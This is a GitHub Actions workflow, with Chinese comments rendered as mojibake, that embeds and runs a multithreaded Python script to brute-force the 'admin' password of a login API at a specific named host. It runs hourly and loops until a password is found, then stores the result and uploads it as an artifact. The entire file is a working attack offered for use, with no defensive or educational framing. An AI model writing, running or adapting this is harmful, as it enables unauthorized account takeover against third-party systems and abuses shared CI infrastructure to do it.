name: Password Brute Force

on:
  workflow_dispatch:  # å…è®¸æ‰‹åŠ¨è§¦å‘
  schedule:
    - cron: '0 */1 * * *'  # æ¯6å°æ—¶è¿è¡Œä¸€æ¬¡

jobs:
  brute-force:
    runs-on: ubuntu-latest
    continue-on-error: true  # å³ä½¿æ­¥éª¤å¤±è´¥ä¹Ÿç»§ç»­
    
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.9'

    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install requests

    - name: Run brute force script
      run: |
        cat > brute_force.py << 'EOF'
        import random
        import string
        import requests
        import json
        import time
        import threading
        from concurrent.futures import ThreadPoolExecutor, as_completed

        # éšæœºç”Ÿæˆ 6~10 ä½çš„å¯†ç ï¼ˆå­—æ¯+æ•°å­—ï¼‰
        def random_password():
            length = random.randint(6, 10)
            chars = string.ascii_letters + string.digits  # a-zA-Z0-9
            return ''.join(random.choice(chars) for _ in range(length))

        # å°è¯•ç™»å½•çš„å‡½æ•°
        def try_login(password, attempt, max_attempts):
            url = "https://zank666api.icu/proxy/api/back/back-user/login"
            
            headers = {
                "Host": "zank666api.icu",
                "Content-Type": "application/json;charset=utf-8",
                "Origin": "https://zank666api.icu",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Accept": "application/json, text/plain, */*",
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
                "Referer": "https://zank666api.icu/",
                "Accept-Language": "zh-CN,zh-Hans;q=0.9"
            }
            
            data = {
                "password": password,
                "userName": "admin"
            }

            try:
                response = requests.post(url, headers=headers, data=json.dumps(data), timeout=10)
                print(f"[{attempt}/{max_attempts}] å°è¯•å¯†ç : {password} | çŠ¶æ€ç : {response.status_code}")

                # æ›´çµæ´»çš„æˆåŠŸåˆ¤æ–­æ¡ä»¶
                if (response.status_code == 200 and 
                    ("æˆåŠŸ" in response.text or 
                     "token" in response.text.lower() or 
                     "success" in response.text.lower())):
                    print("âœ… ç™»å½•æˆåŠŸ! å¯†ç æ˜¯:", password)
                    print("å“åº”å†…å®¹:", response.text)
                    # ä¿å­˜å¯†ç åˆ°æ–‡ä»¶
                    with open("password.txt", "w") as f:
                        f.write(password)
                    return True, password
                else:
                    print(f"âŒ ç™»å½•å¤±è´¥ï¼Œå“åº”: {response.text[:200]}")  # æ‰“å°å‰200å­—ç¬¦é¿å…å¤ªé•¿
                    return False, None

            except requests.exceptions.RequestException as e:
                print(f"[{attempt}/{max_attempts}] è¯·æ±‚é”™è¯¯: {e}")
                return False, None

        # å¤šçº¿ç¨‹çˆ†ç ´å‡½æ•°
        def brute_force_parallel(max_attempts=100, max_workers=5):
            found = False
            correct_password = None
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                # åˆ›å»ºä»»åŠ¡
                future_to_attempt = {
                    executor.submit(try_login, random_password(), i, max_attempts): i 
                    for i in range(1, max_attempts+1)
                }
                
                # å¤„ç†å®Œæˆçš„ä»»åŠ¡
                for future in as_completed(future_to_attempt):
                    attempt = future_to_attempt[future]
                    try:
                        success, password = future.result()
                        if success:
                            found = True
                            correct_password = password
                            # å–æ¶ˆæ‰€æœ‰æœªå®Œæˆçš„ä»»åŠ¡
                            for f in future_to_attempt:
                                f.cancel()
                            break
                    except Exception as e:
                        print(f"å°è¯• {attempt} ç”Ÿæˆå¼‚å¸¸: {e}")
            
            return found, correct_password

        if __name__ == "__main__":
            print("å¼€å§‹å¯†ç çˆ†ç ´...")
            print("=" * 50)
            
            # ä½¿ç”¨å¤šçº¿ç¨‹æ–¹å¼
            start_time = time.time()
            found, password = brute_force_parallel(max_attempts=500, max_workers=10)  # å¢žåŠ å°è¯•æ¬¡æ•°å’Œçº¿ç¨‹æ•°
            end_time = time.time()
            
            print("=" * 50)
            if found:
                print(f"ðŸŽ‰ çˆ†ç ´æˆåŠŸ! å¯†ç æ˜¯: {password}")
                exit(0)  # æˆåŠŸé€€å‡º
            else:
                print("âŒ æœ¬è½®çˆ†ç ´å¤±è´¥ï¼Œæœªæ‰¾åˆ°æ­£ç¡®å¯†ç ")
                exit(0)  # æ”¹ä¸ºæ­£å¸¸é€€å‡ºï¼Œé¿å…workflowå¤±è´¥
        EOF
        
        # è¿è¡Œçˆ†ç ´è„šæœ¬ï¼Œç›´åˆ°æˆåŠŸæ‰¾åˆ°å¯†ç 
        while true; do
          echo "å¼€å§‹æ–°ä¸€è½®çˆ†ç ´å°è¯•..."
          python brute_force.py
          if [ -f "password.txt" ]; then
            echo "å¯†ç å·²æ‰¾åˆ°!"
            cat password.txt
            break
          fi
          echo "ç­‰å¾…10åˆ†é’ŸåŽç»§ç»­å°è¯•..."
          sleep 600  # ç­‰å¾…10åˆ†é’ŸåŽå†è¯•
        done

    - name: Upload result
      if: success()
      uses: actions/upload-artifact@v4
      with:
        name: password-result
        path: password.txt
